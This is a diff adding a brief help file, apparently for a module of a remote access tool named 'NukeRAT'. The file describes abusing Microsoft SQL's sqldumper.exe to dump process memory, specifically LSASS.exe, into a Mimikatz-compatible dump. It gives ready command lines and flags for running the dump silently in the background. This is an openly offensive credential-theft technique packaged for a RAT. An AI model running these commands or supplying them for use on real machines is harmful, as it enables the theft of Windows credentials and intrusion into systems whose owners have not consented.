@@ -1,0 +1,19 @@
+ABOUT
+    Debugging utility included with Microsoft SQL. LOLBAS covers dump
+    process using PID and dump LSASS.exe to Mimikatz compatible dump
+    using PID.
+
+USAGE:
+    sqldumper.exe 464 0 0x0110
+    sqldumper.exe 540 0 0x01100:40
+
+EXAMPLES:
+    sqldumper.exe 464 0 0x0110
+    sqldumper.exe 540 0 0x01100:40
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    sqldumper.exe 464 0 0x0110
